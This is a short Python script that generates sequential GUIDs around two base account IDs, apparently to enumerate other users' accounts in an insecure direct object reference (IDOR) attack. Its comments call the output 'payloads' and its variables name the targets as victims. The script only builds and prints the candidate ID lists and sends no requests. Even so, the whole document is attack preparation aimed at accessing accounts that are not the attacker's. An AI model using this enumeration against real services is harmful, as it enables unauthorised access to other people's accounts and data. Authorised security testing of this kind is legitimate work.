import uuid

def generate_sequential_guids(base_guid, count=50):
    # Extract last part and increment
    parts = base_guid.split('-')
    last_part = int(parts[-1], 16)
    
    guids = []
    for i in range(-count//2, count//2):
        new_last = format(last_part + i, '08x')
        new_guid = f"{parts[0]}-{parts[1]}-{parts[2]}-{parts[3]}-{new_last}"
        guids.append(new_guid)
    
    return guids

def print_guids(title, guids):
    print(f"\n{title} (Total: {len(guids)})")
    print("=" * 50)
    for i, guid in enumerate(guids, 1):
        print(f"{i:3}. {guid}")

# Generate payloads
print("Generating sequential GUIDs...")
print("\nBase GUIDs:")
print("Account 1: 00000000-0000-0000-033f-9cb227550081")
print("Account 2: 00000000-0000-0000-0342-ab857e74c03a")

victim1_guids = generate_sequential_guids("00000000-0000-0000-033f-9cb227550081")
victim2_guids = generate_sequential_guids("00000000-0000-0000-0342-ab857e74c03a")

# Print results
print_guids("Account 1 GUIDs", victim1_guids)
print_guids("Account 2 GUIDs", victim2_guids)

print("\nGeneration complete!")
